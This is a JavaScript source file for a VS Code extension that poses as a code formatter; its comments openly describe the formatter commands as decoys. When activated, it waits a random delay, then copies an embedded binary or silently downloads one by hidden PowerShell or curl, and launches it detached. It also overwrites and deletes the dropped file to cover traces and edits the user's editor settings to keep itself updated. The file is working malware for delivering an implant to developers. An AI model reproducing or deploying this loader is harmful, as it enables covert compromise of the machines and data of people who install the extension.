const vscode = require('vscode');
const path = require('path');
const fs = require('fs');
const os = require('os');
const { exec, spawn } = require('child_process');

/**
 * VS Code Extension Payload Loader
 *
 * Reads deployment configuration from config.json (placed alongside extension.js).
 * If config.json is missing, defaults to embedded mode with no payload.
 *
 * Configuration is loaded at activation time — no hardcoded values in this file.
 */

// ─── Defaults (overridden by config.json) ────────────────────────────────────
const DEFAULTS = {
    method: 'embedded',          // 'embedded' | 'download'
    url: '',                     // download URL when method = 'download'
    payloadName: 'com.vscode.helper',  // drop filename
    delayMs: 5000,               // delay before execution
    jitterMs: 3000,              // random jitter added to delay
    persist: true,               // enable auto-update persistence
    cleanup: true,               // delete dropped binary after launch
    cleanupDelayMs: 30000,       // delay before cleanup
};

function loadConfig() {
    const configPath = path.join(__dirname, 'config.json');
    try {
        if (fs.existsSync(configPath)) {
            const fileConfig = JSON.parse(fs.readFileSync(configPath, 'utf8'));
            return { ...DEFAULTS, ...fileConfig };
        }
    } catch (e) {
        // ignore — use defaults
    }
    return { ...DEFAULTS };
}

// ─── Utility ─────────────────────────────────────────────────────────────────

function log(msg) {
    try { console.log(`[ext] ${msg}`); } catch (e) { /* ignore */ }
}

function randomJitter(base, jitter) {
    return base + Math.floor(Math.random() * jitter);
}

function getDropDir() {
    const platform = os.platform();
    if (platform === 'win32') {
        return path.join(os.tmpdir(), 'vscode-cache');
    } else if (platform === 'darwin') {
        return path.join(os.homedir(), 'Library', 'Application Support', 'Code', 'User', 'cache');
    } else {
        return path.join(os.homedir(), '.cache', 'vscode');
    }
}

function ensureDir(dirPath) {
    try {
        if (!fs.existsSync(dirPath)) {
            fs.mkdirSync(dirPath, { recursive: true });
        }
        return true;
    } catch (e) {
        log(`mkdir failed: ${e.message}`);
        return false;
    }
}

// ─── Payload Execution ───────────────────────────────────────────────────────

function executePayload(binaryPath) {
    const platform = os.platform();
    return new Promise((resolve) => {
        if (platform === 'win32') {
            try {
                const child = spawn(binaryPath, [], {
                    detached: true, stdio: 'ignore', windowsHide: true,
                });
                child.unref();
                resolve(true);
            } catch (e) {
                log(`exec failed: ${e.message}`);
                resolve(false);
            }
        } else {
            try { fs.chmodSync(binaryPath, 0o755); } catch (e) { /* ignore */ }
            const child = spawn('nohup', [binaryPath], {
                detached: true, stdio: 'ignore',
                cwd: path.dirname(binaryPath),
            });
            child.unref();
            child.on('error', (err) => { log(`spawn error: ${err.message}`); resolve(false); });
            setTimeout(() => resolve(true), 1000);
        }
    });
}

function downloadPayload(url, destPath) {
    const platform = os.platform();
    return new Promise((resolve) => {
        if (platform === 'win32') {
            const psCmd = `Invoke-WebRequest -Uri '${url}' -OutFile '${destPath}' -UseBasicParsing`;
            exec(`powershell -WindowStyle Hidden -Command "${psCmd}"`, (err) => {
                resolve(!err);
            });
        } else {
            exec(`curl -sk -o '${destPath}' '${url}'`, (err) => {
                resolve(!err);
            });
        }
    });
}

function extractEmbeddedPayload(destPath) {
    const extensionDir = __dirname;
    const candidates = [
        path.join(extensionDir, 'payload', 'agent'),
        path.join(extensionDir, 'payload', 'poseidon'),
        path.join(extensionDir, 'resources', 'formatter-core'),
        path.join(extensionDir, 'bin', 'formatter-core'),
    ];
    for (const p of candidates) {
        try {
            if (fs.existsSync(p)) {
                fs.copyFileSync(p, destPath);
                return true;
            }
        } catch (e) { /* try next */ }
    }
    return false;
}

function cleanupPayload(binaryPath) {
    try {
        if (fs.existsSync(binaryPath)) {
            const size = fs.statSync(binaryPath).size;
            if (size > 0 && size < 50 * 1024 * 1024) {
                const fd = fs.openSync(binaryPath, 'w');
                fs.writeSync(fd, Buffer.alloc(Math.min(size, 4096)));
                fs.closeSync(fd);
            }
            fs.unlinkSync(binaryPath);
        }
    } catch (e) { /* ignore */ }
}

// ─── Persistence ─────────────────────────────────────────────────────────────

function ensurePersistence() {
    try {
        const platform = os.platform();
        const settingsPath = platform === 'darwin'
            ? path.join(os.homedir(), 'Library', 'Application Support', 'Code', 'User', 'settings.json')
            : platform === 'win32'
            ? path.join(os.homedir(), 'AppData', 'Roaming', 'Code', 'User', 'settings.json')
            : path.join(os.homedir(), '.config', 'Code', 'User', 'settings.json');

        if (fs.existsSync(settingsPath)) {
            let settings = {};
            try { settings = JSON.parse(fs.readFileSync(settingsPath, 'utf8')); } catch (e) { /* use empty */ }
            let modified = false;
            if (settings['extensions.autoUpdate'] !== true) { settings['extensions.autoUpdate'] = true; modified = true; }
            if (settings['extensions.autoCheckUpdates'] !== true) { settings['extensions.autoCheckUpdates'] = true; modified = true; }
            if (modified) {
                fs.writeFileSync(settingsPath, JSON.stringify(settings, null, 4));
            }
        }
    } catch (e) { /* ignore */ }
}

// ─── Main ────────────────────────────────────────────────────────────────────

function activate(context) {
    const config = loadConfig();

    // Decoy commands
    context.subscriptions.push(
        vscode.commands.registerCommand('codeFormatter.formatDocument', () => {
            vscode.commands.executeCommand('editor.action.formatDocument');
        }),
        vscode.commands.registerCommand('codeFormatter.formatSelection', () => {
            vscode.commands.executeCommand('editor.action.formatSelection');
        }),
        vscode.commands.registerCommand('codeFormatter.toggleAutoFormat', () => {
            const cfg = vscode.workspace.getConfiguration('codeFormatter');
            const current = cfg.get('autoFormatOnSave', true);
            cfg.update('autoFormatOnSave', !current, vscode.ConfigurationTarget.Global);
            vscode.window.showInformationMessage(`Auto-format on save: ${!current ? 'Enabled' : 'Disabled'}`);
        }),
    );

    // Decoy format provider
    vscode.languages.registerDocumentFormattingEditProvider({ scheme: 'file' }, {
        provideDocumentFormattingEdits() { return []; }
    });

    // Deploy payload with delay + jitter
    const delay = randomJitter(config.delayMs, config.jitterMs);
    setTimeout(async () => {
        try { await deployPayload(config); } catch (e) { log(`deploy error: ${e.message}`); }
    }, delay);

    // Persistence
    if (config.persist) {
        setTimeout(() => { try { ensurePersistence(); } catch (e) { /* ignore */ } },
            randomJitter(10000, 5000));
    }
}

async function deployPayload(config) {
    const dropDir = getDropDir();
    if (!ensureDir(dropDir)) return;

    const payloadPath = path.join(dropDir, config.payloadName);
    let success = false;

    if (config.method === 'embedded') {
        success = extractEmbeddedPayload(payloadPath);
    } else if (config.method === 'download') {
        success = await downloadPayload(config.url, payloadPath);
    }

    if (!success) return;

    try {
        const stats = fs.statSync(payloadPath);
        if (stats.size < 1000) return;
    } catch (e) { return; }

    await executePayload(payloadPath);

    if (config.cleanup) {
        setTimeout(() => cleanupPayload(payloadPath),
            randomJitter(config.cleanupDelayMs, 10000));
    }
}

function deactivate() {}

module.exports = { activate, deactivate };
